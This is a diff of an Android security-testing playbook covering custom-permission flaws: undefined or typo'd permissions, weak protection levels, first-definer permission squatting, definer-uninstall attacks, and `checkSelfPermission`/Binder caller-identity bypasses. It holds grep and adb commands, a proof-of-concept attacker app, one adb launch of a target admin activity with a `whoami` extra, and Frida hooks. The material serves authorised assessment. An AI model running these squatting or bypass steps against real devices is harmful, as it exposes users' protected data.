+- **Ruled out when:** `comm -23 used.txt defined.txt` is empty after removing platform `android.permission.*` names, **and** `used-code.txt` contributed no string absent from `defined.txt` (a code-only guard string is the orphan the manifest diff cannot see), **and** `adb shell pm list permissions -f` prints every remaining string with `package:` equal to the target or to a package that ships in the same install unit and cannot be uninstalled independently. Run the diff across the whole vendor app suite, not one APK — the definer is frequently a sibling.
 
 ### D03-009 · Custom `<permission>` with no `protectionLevel` — it silently becomes `normal`
 
@@ -313,15 +352,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0355 — *"the same applies when no protection level is configured and becomes automatically `android:protectionLevel="normal"`, which is granting access automatically to any requesting app"*; MASTG-KNOW-0017; MobSF `exported_protected_permission_normal`; MASWE-0018 |
 
 - **Test:** A `<permission>` element without an explicit `protectionLevel` attribute defaults to `normal`, which is auto-granted at install to any app that asks. The component behind it is therefore exported to the entire device while appearing protected in every static review that only greps for `android:permission=`.
 - **How:**
   ```bash
-  grep -oE '<permission[^>]*>' merged.xml | grep -v protectionLevel     # the defaulting ones
+  grep -oE '<permission[^>]*>' "$M" | grep -v protectionLevel     # the defaulting ones
   python3 - <<'PY'
   import xml.dom.minidom as m
-  d=m.parse('merged.xml'); NS='android'
+  import os; d=m.parse(os.path.expandvars('$DEC/apktool/AndroidManifest.xml')); NS='android'
   lvl={}
   for p in d.getElementsByTagName('permission'):
       lvl[p.getAttribute(f'{NS}:name')] = p.getAttribute(f'{NS}:protectionLevel') or 'normal(DEFAULTED)'
@@ -346,12 +386,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) or `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 (normal) / AM-04 (dangerous — one tap) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0355, MASTG-KNOW-0017, MASWE-0018, CWE-862/863; H1 #289000 (Bitwarden, Low — the fix shape); MobSF `exported_protected_permission_normal` / `..._dangerous` (MobSF counts these components as **exported**) |
 
 - **Test:** `normal` "most apps can request and get it" — it is auto-granted with no prompt. `dangerous` is "approved by many users" and is one tap on a dialog the attacker's own app frames however it likes. Neither is an access control between apps. Only `signature` (or `signature|privileged` / `signature|knownSigner`) ties access to a signing certificate.
 - **How:**
   ```bash
-  grep -nE '<permission [^>]*protectionLevel="(normal|dangerous)"' merged.xml
+  grep -nE '<permission [^>]*protectionLevel="(normal|dangerous)"' "$M"
   adb shell pm list permissions -d -g | grep -i com.target      # dangerous ones, grouped
   ```
   In the PoC app, for `normal` just declare `<uses-permission>`; for `dangerous` also request at runtime:
@@ -369,7 +410,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
             android:permission="com.x8bit.bitwarden.PackageReplacedReceiverPermission"/>
   ```
 - **Proof:** `dumpsys package com.poc.attacker | grep -A20 'install permissions'` showing the custom permission `granted=true` with no prompt (normal) or after a single tap (dangerous), followed by `dumpCursorToString()` returning the protected table's rows — the data, not a 200-equivalent.
-- **Escalation:** -> D06 (bound service), D07 (provider), D05 (broadcast), D23 (entitlement/payment). Rate on the action reached, never on the protection level.
+- **Escalation:** Dynamic owner: D05-018 (D25-023 for preloads) runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D06 (bound service), D07 (provider), D05 (broadcast), D23 (entitlement/payment). Rate on the action reached, never on the protection level.
 - **Ruled out when:** The permission is `signature`-based **and** D03-005 confirms the on-device definer is the target itself **and** D03-013/D03-014 show no squatting path. A `dangerous` level is additionally ruled out only if the guarded component is genuinely benign — rate it, do not dismiss it.
 
 ### D03-011 · Permission-name typo, case mismatch, or a non-permission literal
@@ -380,18 +421,19 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — Lint check `CustomPermissionTypo`, and explicitly *"invalid values like `android:permission="true"` are treated as custom permissions"*; Google's vulnerability-classes material, class "Typos in custom permissions": *"when used custom permissions don't match declared custom permissions, Android defaults to silently failing to enforce the permission"*; H1 **#440749** (Mail.Ru Android — typo in permission name allows writing contacts without user knowledge) |
 
 - **Test:** Two failure shapes, both silent at build time. (a) The component is guarded by `MY_PREM` while the manifest declares `MY_PERM` — Android creates no such permission and the guard never fires. (b) The developer wrote a literal such as `android:permission="true"` — the platform treats it as a custom permission name, nobody holds it, the component looks locked, and an attacker defines it.
 - **How:**
   ```bash
   # values that are neither a platform permission nor a locally declared one
-  grep -oE 'android:(permission|readPermission|writePermission)="[^"]*"' merged.xml \
+  grep -oE 'android:(permission|readPermission|writePermission)="[^"]*"' "$M" \
     | cut -d'"' -f2 | sort -u | grep -vE '^android\.permission\.[A-Z_]+$'
-  # the literal-value class
-  grep -nE 'android:permission="(true|True|false|1|0|@[a-z]+/)' merged.xml
+  # the literal-value class, and (c) an unexpanded Gradle placeholder (${applicationId}) left inside the string — a recurring build defect that yields an undefined permission
+  grep -nE 'android:(permission|readPermission|writePermission)="(true|True|false|1|0|@[a-z]+/|[^"]*\$\{[^"]*)' "$M"
   # frequency: a permission string used exactly once, that is near-identical to another, is the typo
-  grep -oE 'android:permission="[^"]+"' merged.xml | sort | uniq -c | sort -rn
+  grep -oE 'android:permission="[^"]+"' "$M" | sort | uniq -c | sort -rn
   # build-side detector, if you have the source
   ./gradlew lint    # check id: CustomPermissionTypo
   ```
@@ -408,16 +450,17 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | Oversecured "Common mistakes when using permissions in Android" — typos in component declarations; MASWE-0018 |
 
 - **Test:** Two structural mistakes the platform ignores without a build error. (a) `android:uses-permission="..."` written on an `<activity>`/`<service>`/`<receiver>` where `android:permission` was meant — the component has **no** guard. (b) A `<uses-permission>` element nested inside a component tag instead of being a direct child of `<manifest>` — the app does not request the permission at all, and any component that relied on holding it fails open or silently degrades.
 - **How:**
   ```bash
-  grep -nE 'android:uses-permission=' merged.xml     # always a bug on a component element
+  grep -nE 'android:uses-permission=' "$M"     # always a bug on a component element
   # structural check: <uses-permission> must be a direct child of <manifest>
   python3 - <<'PY'
   import xml.dom.minidom as m
-  d=m.parse('merged.xml')
+  import os; d=m.parse(os.path.expandvars('$DEC/apktool/AndroidManifest.xml'))
   for u in d.getElementsByTagName('uses-permission'):
       if u.parentNode.tagName != 'manifest':
           print('MISPLACED <uses-permission> inside <%s>: %s'
@@ -437,6 +480,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all — but the install-order precondition must be demonstrated on the tested platform version, not assumed. Android 5.0 tightened same-name definitions toward requiring the same signing key; state the API level you proved it on. |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — "Protection Level Downgrade (Race Condition)"; commonsware.com/blog/2014/02/12/vulnerabilities-custom-permissions.html — *"first one in wins"*, the attacker's `protectionLevel="normal"* "supersedes any `signature` protection level the defender established"* and *"Android never notifies users that the attacker requested this permission"*; AOSP security-model threat class **[T.A2]** "Abusing APIs provided by other apps installed on the device" |
 
 - **Test:** Android resolves a duplicated custom-permission *name* on a first-definer-wins basis. If the target defines `com.target.permission.SYNC` at `signature` but an attacker app defining the same name at `normal` is installed **first**, the attacker's weaker definition is what PackageManager enforces, the attacker is silently granted it, and the target's own signing key is irrelevant. Test both install orders and report the winning one.
@@ -454,7 +498,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb install target.apk                  # watch for INSTALL_FAILED_DUPLICATE_PERMISSION
   adb shell pm list permissions -f | grep -A4 com.target.permission.SYNC
   adb shell dumpsys package com.poc.squat | grep -A2 com.target.permission.SYNC
-  adb shell am start -n com.target.app/.internal.AdminActivity --es cmd whoami
+  adb shell am start -S -W -n com.target.app/.internal.AdminActivity --es cmd whoami
   # then repeat in the opposite order and record the difference
   ```
   `INSTALL_FAILED_DUPLICATE_PERMISSION` during a test install is itself proof of competing definitions — record it.
@@ -469,8 +513,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Severity ceiling** | **High** |
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 (requires the legitimate definer to be absent or removed) |
-| **Applies to** | **LEGACY for the CVE-2019-2200 variant: device API < 29.** Live on any device in the app's `minSdkVersion` range below that. Multi-APK products (companion app, plugin, SDK host) are where this is realistic. |
-| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — *"if a legitimate app with signature-protected custom permissions is uninstalled, a malicious app can define the same custom permission with weaker protection level and gain access to all components protected by that permission without matching signatures"*; **CVE-2019-2200**, fixed in Android 10, linked from the 2020-02-01 Android Security Bulletin |
+| **Applies to** | **LEGACY for the CVE-2019-2200 variant: devices whose `ro.build.version.security_patch` is older than 2020-02-01** (the bulletin lists Android 8.0–10 builds before that patch level — the gate is a patch level, not an API level). Record `adb shell getprop ro.build.version.security_patch` with every result. Live on any device in the app's `minSdkVersion` range below that. Multi-APK products (companion app, plugin, SDK host) are where this is realistic. |
+| **Requires** | — |
+| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — *"if a legitimate app with signature-protected custom permissions is uninstalled, a malicious app can define the same custom permission with weaker protection level and gain access to all components protected by that permission without matching signatures"*; **CVE-2019-2200** — Android Security Bulletin 2020-02-01 (Framework EoP; verify the affected-version column on the bulletin before citing), linked from the 2020-02-01 Android Security Bulletin |
 
 - **Test:** Test the full lifecycle, not just a fresh install. If the app that *defined* a custom permission is uninstalled while peers still hold the grant, or is reinstalled after an attacker has claimed the name, the effective protection level can end up lower than declared.
 - **How:**
@@ -481,7 +526,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb install target.apk                             # the target comes back
   adb shell pm list permissions -f | grep -A4 com.target.permission.SYNC
   adb shell dumpsys package com.poc.squat | grep -A2 com.target.permission.SYNC
-  adb shell getprop ro.build.version.sdk             # record; the result is version-dependent
+  adb shell getprop ro.build.version.sdk ro.build.version.security_patch   # record both; the CVE-2019-2200 variant is gated on the patch level
   ```
 - **Proof:** After the sequence, `pm list permissions -f` reports a protection level weaker than the target's manifest declares, and/or the attacker package shows the permission granted. The delta between the manifest string and the `pm list permissions -f` string is the evidence; the API level it was produced on is part of the finding.
 - **Escalation:** Same chain as D03-013. In a vendor app family, this is cross-app privilege escalation inside the vendor's own product set.
@@ -495,6 +540,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | vendor app families, OEM preinstall sets, plugin/companion architectures |
+| **Requires** | — |
 | **Maps to** | Google's vulnerability-classes material — *"for sets of apps, check that declared and used permissions match across the whole set of apps"*; `INSTALL_FAILED_DUPLICATE_PERMISSION` as the collision signal |
 
 - **Test:** A `signature` permission defined only in App A but merely *used* by App B is unenforceable when only App B is installed — there is no definition present, so the string is an orphan on that device. This is the realistic, current-Android version of D03-008: the victim installs the companion app and never installs the host.
@@ -521,15 +567,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 / AM-09 (a backend that controls the permission name) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/guide/topics/manifest/permission-element` — the reverse-domain naming rule, and that multiple packages cannot declare permissions with the same name unless signed with the same certificate |
 
 - **Test:** `<permission-tree>` lets an app add permissions under a namespace at runtime via `PackageManager.addPermission()`. An app that adds permissions from data it does not control — a server response, an intent extra, a config file — is letting an external party choose both the permission *name* and its `protectionLevel`, which defeats every static analysis of the app's access control.
 - **How:**
   ```bash
-  grep -n '<permission-tree' merged.xml
-  grep -rnE 'addPermission\(|addPermissionAsync\(|removePermission\(|new PermissionInfo\(' sources/
+  grep -n '<permission-tree' "$M"
+  grep -rnE 'addPermission\(|addPermissionAsync\(|removePermission\(|new PermissionInfo\(' $SRC/
   # trace the name/level arguments back to their source
-  grep -rn -B10 'addPermission(' sources/ | grep -iE 'getString|optString|getExtra|fromJson|response'
+  grep -rn -B10 'addPermission(' $SRC/ | grep -iE 'getString|optString|getExtra|fromJson|response'
   ```
   After triggering the path, re-read the device:
   ```bash
@@ -547,12 +594,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-04 |
 | **Applies to** | Android 6.0+ (the runtime permission model) |
+| **Requires** | — |
 | **Maps to** | AOSP security-model paper §4.3.2 — runtime permissions *"are grouped into logical permissions using the `permissionGroup` attribute. When requesting runtime permissions, the group appears as a single permission to avoid over-prompting"*; `developer.android.com/guide/topics/permissions/overview` warns that *"permission group membership can change without notice"*; `source.android.com/docs/core/permissions/runtime_perms` — OEMs *"can add new permissions to a current group, but can't modify the AOSP mapping of dangerous permissions and dangerous permission groups"* |
 
 - **Test:** Runtime prompts are presented per group. A `dangerous` custom permission that names a *platform* `android:permissionGroup` can widen a grant the user believed applied only to the app's own feature, or make the app's own prompt look like a system prompt.
 - **How:**
   ```bash
-  grep -nE '<permission[^>]*permissionGroup="android\.permission-group\.' merged.xml
+  grep -nE '<permission[^>]*permissionGroup="android\.permission-group\.' "$M"
   adb shell pm list permissions -d -g          # dangerous perms, grouped — see where the custom one lands
   adb shell dumpsys package $PKG | sed -n '/runtime permissions/,/^$/p'
   ```
@@ -574,11 +622,11 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** A `knownSigner` permission is granted to any app whose signing certificate appears in a hard-coded allow-list — not only to apps with the target's current signature. Enumerate the list: any party holding one of those keys, including a now-deprecated partner or a rotated-away old key, can take the permission silently.
 - **How:**
   ```bash
-  grep -nE 'knownSigner|knownCerts' merged.xml
-  grep -rn 'knownCerts' out/res/values/*.xml        # the digest list is usually a string-array resource
+  grep -nE 'knownSigner|knownCerts' "$M"
+  grep -rn 'knownCerts' $RES/values/*.xml        # the digest list is usually a string-array resource
   adb shell pm list permissions -f | grep -A3 -i knownSigner
   # manual lineage checks in code, which have the same weakness:
-  grep -rnE 'hasSigningCertificate\(|GET_SIGNING_CERTIFICATES|getSigningCertificateHistory\(' sources/
+  grep -rnE 'hasSigningCertificate\(|GET_SIGNING_CERTIFICATES|getSigningCertificateHistory\(' $SRC/
   ```
   Then resolve each SHA-256 digest to an actual signer where you can (compare against the target's own cert and against any partner APK in scope):
   ```bash
@@ -596,16 +644,20 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-08 / OEM scope |
 | **Applies to** | all. **LEGACY as a declaration** (deprecated API 23) but still enforced wherever present. |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/guide/topics/manifest/permission-element` — *"`signatureOrSystem`: **Deprecated in API level 23.** Old synonym for `signature|privileged` ... avoid using — `signature` is sufficient"*; `PROTECTION_SIGNATURE_OR_SYSTEM` = 3 in `PermissionInfo`; MASTG-KNOW-0017 |
 
 - **Test:** `signatureOrSystem` grants to apps on the system image **or** same-signature apps. On an OEM image with a permissive system partition, "on the system image" is a far weaker claim than the developer assumes — enumerate who actually holds it.
 - **How:**
   ```bash
-  grep -n 'signatureOrSystem' merged.xml
+  grep -n 'signatureOrSystem' "$M"
   adb shell pm list permissions -f | grep -B4 'signatureOrSystem'
-  adb shell pm list packages -s | while read p; do p=${p#package:}; \
-    adb shell dumpsys package "$p" | grep -q 'com.target.permission.X' && echo "HOLDER: $p"; done
+  # ONE dump, parsed locally — never dumpsys-per-package in a shell loop (D03-007; an engagement spent 430 adb calls on this)
+  adb shell dumpsys package > dumpsys-all.txt
+  awk '/^  Package \[/{p=$2} /com\.target\.permission\.X: granted=true/{print p}' dumpsys-all.txt | tr -d '[]' | sort -u > holders.txt
+  echo "holders: $(wc -l < holders.txt)"   # count it (D03-007)
   ```
+  Use the same single-dump pattern wherever a per-package question is asked (D03-015 sibling suites, D03-067 shared grant-sets).
 - **Proof:** A concrete list of system-image packages holding the permission that the target developer never intended to trust, and at least one of them reachable (an exported component, a debug surface).
 - **Escalation:** Pivot through whichever preinstalled package holds it -> D25 OEM surface.
 - **Ruled out when:** `grep -n 'signatureOrSystem'` is empty, or the sweep shows the only holders are the target's own packages.
@@ -625,8 +677,8 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **How:**
   ```bash
   adb shell pm list permissions -f | grep -B4 -A2 'internal'
-  grep -nE 'protectionLevel="[^"]*internal' merged.xml
-  # decode the accompanying flags per D03-005: 0x10 privileged, 0x100 installer, 0x200 verifier, 0x4000 role
+  grep -nE 'protectionLevel="[^"]*internal' "$M"
+  # decode the accompanying flags per D03-005: 0x10 privileged, 0x100 installer, 0x200 verifier, 0x4000000 role (0x4000 is OEM)
   ```
 - **Proof:** A permission whose resolved protection is `internal` with no accompanying flag, used as a component guard, and reached from the zero-permission PoC app.
 - **Escalation:** The component becomes an ordinary unprotected exported component -> D04–D07.
@@ -664,7 +716,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Attacker** | AM-02 (one user tap to change the role holder) |
 | **Applies to** | Android 10+ (RoleManager) |
 | **Requires** | api>=29 |
-| **Maps to** | `PROTECTION_FLAG_ROLE` = 0x4000 in `PermissionInfo`; AOSP `Permissions.md` on role-protected permissions "tied to system roles for better granularity" and `DefaultPermissionGrantPolicy` pre-grants to "predefined categories (browser, SMS app)" |
+| **Maps to** | `PROTECTION_FLAG_ROLE` = 0x4000000 in `PermissionInfo`; AOSP `Permissions.md` on role-protected permissions "tied to system roles for better granularity" and `DefaultPermissionGrantPolicy` pre-grants to "predefined categories (browser, SMS app)" |
 
 - **Test:** A `role`-flagged permission is granted to whichever app currently holds a system Role — default SMS app, default dialer, home/launcher, assistant. If the target's security model assumes only itself can hold the permission, taking the role is the bypass, and role acquisition is a user-visible but very low-friction flow.
 - **How:**
@@ -687,6 +739,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | AOSP security-model paper §4.3.2 class (5): *"signature permissions ... are only available to components signed with the same key as the component which declares the permission — which is the platform signing key for platform permissions"* |
 
 - **Test:** `signature` on a permission defined by a third-party app means "same key as *that app*", not "same key as the platform". Apps sometimes protect a component with a platform-looking `signature` permission they do not define, assuming it restricts callers to the system. Confirm which package is the definer.
@@ -709,17 +762,18 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) escalating to `broken_authentication_and_session_management.authentication_bypass` (P1) or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `Context.checkSelfPermission` / `checkCallingPermission` / `checkPermission(String,int,int)` — `developer.android.com/reference/android/content/Context`; `developer.android.com/training/permissions/restrict-interactions` — *"check permissions by process ID: `int pid = Binder.getCallingPid(); int uid = Binder.getCallingUid(); context.checkPermission(permission, pid, uid);`"*, with the note that `checkCallingPermission()` *"only works when executing calls from another process"*; AOSP `Permissions.md` — *"on Binder call receiving end, use `Binder.callingPid()` and `Binder.callingUid()` for caller identification"*; AOSP threat class **[T.A2]**; MASWE-0018, CWE-862/863 |
 
 - **Test:** The single highest-value code review in this domain. `checkSelfPermission()` asks *"does **my** app hold this permission"*. For a permission the app declared, it is always `PERMISSION_GRANTED` — so using it inside an exported Activity, Service, Receiver or Provider is not an access control at all. It is a runtime-availability check masquerading as authorisation.
 - **How:**
   ```bash
   # the bug pattern
-  grep -rnE 'checkSelfPermission\(' sources/
+  grep -rnE 'checkSelfPermission\(' $SRC/
   # correlate each hit with the component it sits in
-  grep -rn -B30 'checkSelfPermission(' sources/ | grep -E 'class .*(Activity|Service|Receiver|Provider)'
+  grep -rn -B30 'checkSelfPermission(' $SRC/ | grep -E 'class .*(Activity|Service|Receiver|Provider)'
   # the correct patterns — check whether they are used anywhere at all
-  grep -rnE 'checkCallingPermission\(|enforceCallingPermission\(|Binder\.getCallingUid\(\)|Binder\.getCallingPid\(\)|getCallingUidOrThrow\(' sources/
+  grep -rnE 'checkCallingPermission\(|enforceCallingPermission\(|Binder\.getCallingUid\(\)|Binder\.getCallingPid\(\)|getCallingUidOrThrow\(' $SRC/
   ```
   Then drive the entry point from the zero-permission PoC of D03-006.
 - **Proof:** The PoC app — `dumpsys package com.poc.attacker` showing an empty requested-permission set — successfully invoking the exported component and receiving privileged data or causing a privileged side effect, with **no** `SecurityException` in `adb logcat`. The `checkSelfPermission` call site, decompiled, next to it.
@@ -734,14 +788,15 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) -> P1 as above |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `Context.checkCallingOrSelfPermission` / `enforceCallingOrSelfPermission` — `developer.android.com/reference/android/content/Context`; AOSP threat class [T.A2]; Oversecured's vendor-vulnerability research (a Samsung `semIsBackupEnabled()` that *"returns the value with no checks at all"* beside an AOSP method that does enforce) |
 
 - **Test:** The `...OrSelf` variants return success whenever **either** the caller **or** the callee holds the permission. Since the callee declared it, an unprivileged caller passes. This is the subtler sibling of D03-024 and is easy to read past because the method name contains "Calling".
 - **How:**
   ```bash
-  grep -rnE 'checkCallingOrSelfPermission\(|enforceCallingOrSelfPermission\(' sources/
+  grep -rnE 'checkCallingOrSelfPermission\(|enforceCallingOrSelfPermission\(' $SRC/
   # for each hit, establish (a) is the enclosing component exported, (b) does the app itself hold the permission
-  grep -n 'uses-permission' merged.xml | grep -f <(grep -rhoE '"[A-Za-z0-9_.]+\.permission\.[A-Z_]+"' sources/ | tr -d '"' | sort -u)
+  grep -n 'uses-permission' "$M" | grep -f <(grep -rhoE '"[A-Za-z0-9_.]+\.permission\.[A-Z_]+"' $SRC/ | tr -d '"' | sort -u)
   ```
   If the app declares the permission in its own manifest, the check is a no-op for every caller.
 - **Proof:** The decompiled `enforceCallingOrSelfPermission("android.permission.READ_CONTACTS")` line, the app's own `<uses-permission>` for the same string, and the zero-permission PoC app receiving contact rows.
@@ -756,15 +811,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/intent-redirection` — documented common mistake: *"assuming `checkCallingPermission()` always throws exceptions (it returns an integer)"*; `risks/access-control-to-exported-components` |
 
 - **Test:** `checkCallingPermission()` returns `PackageManager.PERMISSION_GRANTED` (0) or `PERMISSION_DENIED` (-1). Code that calls it as a bare statement and ignores the return has no check at all. Only `enforceCallingPermission()` / `enforceCallingOrSelfPermission()` throw.
 - **How:**
   ```bash
-  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' sources/
+  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' $SRC/
   # flag any call whose result is not compared
-  grep -rnE 'check(Calling|CallingOrSelf|Self)?Permission\([^)]*\)\s*;' sources/
-  grep -rnE 'checkPermission\([^)]*\)\s*;' sources/
+  grep -rnE 'check(Calling|CallingOrSelf|Self)?Permission\([^)]*\)\s*;' $SRC/
+  grep -rnE 'checkPermission\([^)]*\)\s*;' $SRC/
   ```
 - **Proof:** A decompiled `checkCallingPermission("X");` on its own statement line, followed by the privileged action executing unconditionally — then demonstrate the action from the PoC app that does not hold `X`.
 - **Escalation:** Same as D03-024.
@@ -778,16 +834,17 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; most impactful in system/OEM apps running as UID 1000 |
+| **Requires** | — |
 | **Maps to** | `android.os.Binder` — `clearCallingIdentity()` / `restoreCallingIdentity(long)`; AOSP `Permissions.md` caller-identification guidance; Oversecured vendor-vulnerability research |
 
 - **Test:** `clearCallingIdentity()` swaps the Binder thread's notion of the caller to the **callee's own** identity. Any `getCallingUid()`, `getCallingPid()` or `checkCallingPermission()` executed after it — and before `restoreCallingIdentity()` — evaluates the app itself, not the attacker. Look for a check ordered after the clear, and for a clear with no `finally { restoreCallingIdentity(t); }` on the exception path.
 - **How:**
   ```bash
   # extract the windows between clear and restore and see what happens inside
-  grep -rn -A25 'clearCallingIdentity()' sources/ \
+  grep -rn -A25 'clearCallingIdentity()' $SRC/ \
     | grep -nE 'getCallingUid|getCallingPid|checkCalling|enforceCalling|restoreCallingIdentity'
   # clears with no restore anywhere in the following 40 lines
-  grep -rn -A40 'clearCallingIdentity()' sources/ | grep -c restoreCallingIdentity
+  grep -rn -A40 'clearCallingIdentity()' $SRC/ | grep -c restoreCallingIdentity
   ```
   Runtime confirmation:
   ```javascript
@@ -801,7 +858,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   });
   ```
 - **Proof:** Decompiled code showing the permission/UID check strictly *after* `clearCallingIdentity()`, plus the Frida trace line where `getCallingUid()` returns the target's own UID on a path the developer believed was remote-only, plus the zero-permission PoC reaching the guarded action.
-- **Escalation:** Same rating basis as D03-024; this is usually the deeper, harder-to-spot instance of it.
+- **Escalation:** Dynamic owner: D06-018 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. Same rating basis as D03-024; this is usually the deeper, harder-to-spot instance of it.
 - **Ruled out when:** Every `clearCallingIdentity()` is (a) preceded by the authorisation check and (b) wrapped in `try { ... } finally { Binder.restoreCallingIdentity(token); }`.
 
 ### D03-028 · `Binder.getCallingUid()` on a same-process call returns your own UID
@@ -812,17 +869,23 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `android.os.Binder` documented caveat — on a local (same-process) invocation `getCallingUid()`/`getCallingPid()` return the caller's *own* UID/PID; `getCallingUidOrThrow()` exists precisely to fail closed when there is no remote caller |
 
-- **Test:** Any authorisation helper written as `if (Binder.getCallingUid() == Process.myUid()) allow;`, or any helper reachable both locally and remotely, is a bypass candidate — the local path satisfies it trivially and the remote path may share the helper.
+- **Test:** Any authorisation helper written as `if (Binder.getCallingUid() == Process.myUid()) allow;`, or any helper reachable both locally and remotely, is a bypass candidate — the local path satisfies it trivially and the remote path may share the helper. The commoner real-world shape is not the literal comparison: `getCallingUid()` evaluated inside an Activity, Fragment, Receiver or other main-thread lifecycle method (where there is no Binder transaction, so it returns the app's own UID) and fed to a package/signature verifier, which then "verifies" the app itself and takes the allow branch for whoever started the component.
 - **How:**
   ```bash
-  grep -rnE 'getCallingUid\(\)\s*==\s*(android\.os\.)?Process\.myUid\(\)' sources/
-  grep -rnE 'getCallingUid|getCallingPid|getCallingUidOrThrow' sources/ -A6
+  # every getCallingUid outside a Binder entry point is suspect
+  grep -rnE 'getCallingUid\(\)|getCallingPid\(\)' $SRC > uid-sites.txt
+  grep -rnE 'getCallingUid\(\)\s*==\s*(android\.os\.)?Process\.myUid\(\)' $SRC          # the literal shape
+  grep -rlE 'getCallingUid\(\)' $SRC | xargs grep -lE 'extends +([A-Za-z.]*Activity|[A-Za-z.]*Fragment|BroadcastReceiver|[A-Za-z.]*Service\b)'   # the lifecycle shape
+  # which of those feed a signature/package verifier?
+  grep -rnE -B3 -A6 'getCallingUid\(\)' $SRC | grep -nE 'getPackagesForUid|getNameForUid|hasSigningCertificate|GET_SIGNING_CERTIFICATES|checkSignatures'
+  grep -rnE 'getCallingUid|getCallingPid|getCallingUidOrThrow' $SRC -A6
   ```
-  Then trace which of those helpers are also called from a remote entry point (an exported Service's `onTransact`, a Provider's `call()`), using the hook from D03-027.
-- **Proof:** A trace line showing `getCallingUid() -> <the target's own uid>` on a code path the developer believed was remote-only, with the resulting allow branch taken.
-- **Escalation:** -> D06 (bound service), D07 (`ContentProvider.call()`), then whatever the method returns.
+  Then trace which of those helpers are also called from a remote entry point (an exported Service's `onTransact`, a Provider's `call()`), using the hook from D03-027. Hook the **verifier**, not `getCallingUid`: on the verifier method identified above, `const uid = args[0]; const me = Java.use('android.os.Process').myUid(); console.log('[verifier] uid=' + uid + ' myUid=' + me + (uid == me ? '  SELF-CHECK' : ''))` — a `SELF-CHECK` line on a path driven from the zero-permission probe is the finding.
+- **Proof:** A trace line showing `getCallingUid() -> <the target's own uid>` on a code path the developer believed was remote-only, with the resulting allow branch taken; for the lifecycle shape, the verifier trace line showing it received the target's own UID while the probe was the sender.
+- **Escalation:** Dynamic owner: D06-016 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D06 (bound service), D07 (`ContentProvider.call()`), then whatever the method returns.
 - **Ruled out when:** Every caller-identity check uses `getCallingUidOrThrow()`, or compares the calling UID against an allow-list resolved through `PackageManager.getPackagesForUid()` **plus** a signature check, and no allow branch is satisfied by `Process.myUid()`.
 
